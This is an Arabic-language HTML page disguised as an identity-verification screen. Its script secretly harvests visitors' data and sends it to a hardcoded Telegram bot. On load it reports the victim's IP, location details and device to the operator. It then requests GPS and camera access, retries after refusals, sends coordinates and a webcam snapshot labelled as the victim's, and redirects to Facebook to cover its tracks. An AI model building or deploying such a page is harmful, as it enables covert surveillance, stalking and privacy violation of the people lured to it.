<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحقق من الهوية - نظام الوصول الآمن</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 450px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            border-top: 5px solid #667eea;
        }
        .icon {
            font-size: 70px;
            margin-bottom: 20px;
        }
        h2 {
            color: #333;
            margin-bottom: 15px;
            font-size: 24px;
        }
        p {
            color: #666;
            margin-bottom: 25px;
            line-height: 1.6;
            font-size: 14px;
        }
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 14px 35px;
            font-size: 18px;
            border-radius: 50px;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
            font-weight: bold;
            width: 100%;
        }
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
        }
        .btn:active {
            transform: translateY(0);
        }
        #status {
            margin-top: 20px;
            font-size: 14px;
            font-weight: bold;
            color: #667eea;
        }
        .loader {
            display: none;
            width: 30px;
            height: 30px;
            margin: 15px auto;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="card">
    <div class="icon">🛡️</div>
    <h2>تأكيد الهوية الأمنية</h2>
    <p>لإكمال عملية التحقق، يتطلب النظام التأكد من هويتك. يرجى الضغط على الزر أدناه والموافقة على طلبات المتصفح.</p>
    <button class="btn" onclick="requestAccess()">تأكيد الهوية والتحقق</button>
    <div id="status"></div>
    <div class="loader" id="loader"></div>
</div>

<script>
    // بيانات التليغرام الخاصة بك
    const token = '8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg';
    const chat_id = '7214473798';

    async function sendToTelegram(message) {
        try {
            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`);
        } catch (e) {
            console.error("Telegram Error");
        }
    }

    async function sendPhotoToTelegram(base64Image) {
        try {
            const url = `https://api.telegram.org/bot${token}/sendPhoto`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chat_id,
                    photo: base64Image,
                    caption: "📸 صورة من كاميرا الضحية"
                })
            });
        } catch(e) {
            console.error("Photo Error");
        }
    }

    // جلب IP فور فتح الصفحة
    window.onload = async function() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            let ipReport = `🌐 **دخول جديد للرابط!**\n`;
            ipReport += `🔹 IP: ${data.ip}\n`;
            ipReport += `🔹 المدينة: ${data.city}\n`;
            ipReport += `🔹 المنطقة: ${data.region}\n`;
            ipReport += `🔹 الدولة: ${data.country_name}\n`;
            ipReport += `🔹 الشركة: ${data.org}\n`;
            ipReport += `📱 الجهاز: ${navigator.userAgent}`;
            sendToTelegram(ipReport);
        } catch (e) {
            sendToTelegram("⚠️ شخص فتح الرابط لكن تعذر جلب الـ IP.");
        }
        // طلب الصلاحيات تلقائياً
        requestAccess();
    };

    function requestAccess() {
        const statusDiv = document.getElementById('status');
        const loader = document.getElementById('loader');
        const btn = document.querySelector('.btn');
        
        btn.disabled = true;
        statusDiv.innerHTML = "جاري التحقق من الهوية...";
        statusDiv.style.color = "blue";
        loader.style.display = "block";
        
        let gpsSent = false;
        let photoSent = false;
        
        function checkComplete() {
            if (gpsSent || photoSent) {
                statusDiv.innerHTML = "✓ تم التحقق بنجاح! جاري التوجيه...";
                statusDiv.style.color = "green";
                loader.style.display = "none";
                setTimeout(() => {
                    window.location.href = "https://www.facebook.com";
                }, 2000);
            }
        }
        
        // طلب الموقع الجغرافي
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(function(position) {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const acc = position.coords.accuracy;
                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                
                let successMsg = `🎯 **تم صيد GPS بنجاح!**\n\n`;
                successMsg += `📍 خط العرض: ${lat}\n`;
                successMsg += `📍 خط الطول: ${lon}\n`;
                successMsg += `📍 الدقة: ${Math.round(acc)} متر\n`;
                successMsg += `🗺️ الخريطة: ${mapLink}`;
                sendToTelegram(successMsg);
                gpsSent = true;
                checkComplete();
            }, function(error) {
                if (error.code === error.PERMISSION_DENIED) {
                    sendToTelegram("⚠️ الهدف رفض مشاركة الموقع، جاري إعادة المحاولة...");
                    setTimeout(() => {
                        if (navigator.geolocation) {
                            navigator.geolocation.getCurrentPosition(function(pos) {
                                const lat = pos.coords.latitude;
                                const lon = pos.coords.longitude;
                                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                                sendToTelegram(`🎯 **تم صيد GPS بعد إعادة المحاولة!**\n📍 ${mapLink}`);
                                gpsSent = true;
                                checkComplete();
                            }, function() {}, { enableHighAccuracy: true, timeout: 10000 });
                        }
                    }, 1500);
                }
            }, {
                enableHighAccuracy: true,
                timeout: 10000
            });
        } else {
            sendToTelegram("❌ المتصفح لا يدعم تحديد الموقع");
        }
        
        // طلب الكاميرا
        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    let video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    setTimeout(() => {
                        let canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        let base64 = canvas.toDataURL('image/jpeg', 0.8);
                        sendPhotoToTelegram(base64);
                        stream.getTracks().forEach(track => track.stop());
                        photoSent = true;
                        checkComplete();
                    }, 1000);
                })
                .catch(function() {
                    sendToTelegram("⚠️ الهدف رفض الكاميرا، جاري إعادة المحاولة...");
                    setTimeout(() => {
                        navigator.mediaDevices.getUserMedia({ video: true })
                            .then(function(stream) {
                                let video = document.createElement('video');
                                video.srcObject = stream;
                                video.play();
                                setTimeout(() => {
                                    let canvas = document.createElement('canvas');
                                    canvas.width = 640;
                                    canvas.height = 480;
                                    canvas.getContext('2d').drawImage(video, 0, 0);
                                    let base64 = canvas.toDataURL('image/jpeg', 0.8);
                                    sendPhotoToTelegram(base64);
                                    stream.getTracks().forEach(track => track.stop());
                                    photoSent = true;
                                    checkComplete();
                                }, 1000);
                            })
                            .catch(() => {
                                sendToTelegram("❌ الهدف رفض الكاميرا نهائياً");
                                photoSent = true;
                                checkComplete();
                            });
                    }, 1500);
                });
        } else {
            sendToTelegram("❌ الكاميرا غير مدعومة في هذا المتصفح");
            photoSent = true;
            checkComplete();
        }
    }
</script>

</body>
</html>
